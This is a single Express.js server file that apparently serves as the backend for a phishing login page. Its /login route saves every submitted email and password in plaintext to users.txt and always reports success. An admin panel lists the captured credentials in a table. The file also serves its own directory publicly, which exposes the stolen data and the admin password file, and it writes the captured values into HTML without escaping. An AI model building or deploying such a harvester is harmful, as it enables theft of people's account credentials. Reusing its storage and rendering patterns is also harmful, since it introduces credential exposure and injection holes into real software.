const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const session = require('express-session');

const app = express();
const PORT = 3000;
const ADMIN_CONFIG_FILE = 'admin_config.json';
const USERS_FILE = 'users.txt';

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '.')));
app.use(session({
    secret: 'secret-key-just-for-testing',
    resave: false,
    saveUninitialized: true
}));

// Helper: Check if admin is configured
const isAdminConfigured = () => fs.existsSync(ADMIN_CONFIG_FILE);

// Helper: Get admin password
const getAdminPassword = () => {
    if (!isAdminConfigured()) return null;
    const data = fs.readFileSync(ADMIN_CONFIG_FILE);
    return JSON.parse(data).password;
};

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', (req, res) => {
    const { email, password } = req.body;
    const logEntry = `Email: ${email}, Password: ${password}\n`;

    fs.appendFile(USERS_FILE, logEntry, (err) => {
        if (err) {
            console.error('Error saving data:', err);
            return res.status(500).send('Internal Server Error');
        }
        console.log('User saved:', email);
        res.send('<h1>Login Successful! Data saved.</h1><a href="/">Go back</a>');
    });
});

// Admin Routes

app.get('/admin', (req, res) => {
    // 1. First Time Launch: Setup
    if (!isAdminConfigured()) {
        return res.send(`
            <h1>Admin Setup</h1>
            <p>Please set an admin password for the first time.</p>
            <form action="/admin/setup" method="POST">
                <label>Set Password: <input type="password" name="password" required></label>
                <button type="submit">Save</button>
            </form>
        `);
    }

    // 2. Not Logged In: Login
    if (!req.session.isAdmin) {
        return res.send(`
            <h1>Admin Login</h1>
            <form action="/admin/login" method="POST">
                <label>Password: <input type="password" name="password" required></label>
                <button type="submit">Login</button>
            </form>
        `);
    }

    // 3. Logged In: Show Table
    fs.readFile(USERS_FILE, 'utf8', (err, data) => {
        if (err && err.code !== 'ENOENT') {
            return res.status(500).send('Error reading user data');
        }
        
        const lines = data ? data.trim().split('\n') : [];
        let tableRows = lines.map(line => {
            // Expected format: "Email: test@test.com, Password: 123"
            const emailMatch = line.match(/Email: (.*?),/);
            const passMatch = line.match(/Password: (.*)/);
            const email = emailMatch ? emailMatch[1] : 'Unknown';
            const pass = passMatch ? passMatch[1] : 'Unknown';
            return `<tr><td>${email}</td><td>${pass}</td></tr>`;
        }).join('');

        res.send(`
            <h1>Admin Panel</h1>
            <table border="1" cellpadding="5">
                <thead><tr><th>Email</th><th>Password</th></tr></thead>
                <tbody>${tableRows || '<tr><td colspan="2">No data yet</td></tr>'}</tbody>
            </table>
            <br>
            <a href="/admin/logout">Logout</a>
        `);
    });
});

app.post('/admin/setup', (req, res) => {
    if (isAdminConfigured()) return res.status(403).send('Admin already configured.');
    
    const { password } = req.body;
    fs.writeFileSync(ADMIN_CONFIG_FILE, JSON.stringify({ password }));
    req.session.isAdmin = true; // Auto login after setup
    res.redirect('/admin');
});

app.post('/admin/login', (req, res) => {
    const { password } = req.body;
    const storedPassword = getAdminPassword();

    if (password === storedPassword) {
        req.session.isAdmin = true;
        res.redirect('/admin');
    } else {
        res.send('<h1>Invalid Password</h1><a href="/admin">Try Again</a>');
    }
});

app.get('/admin/logout', (req, res) => {
    req.session.isAdmin = false;
    res.redirect('/admin');
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});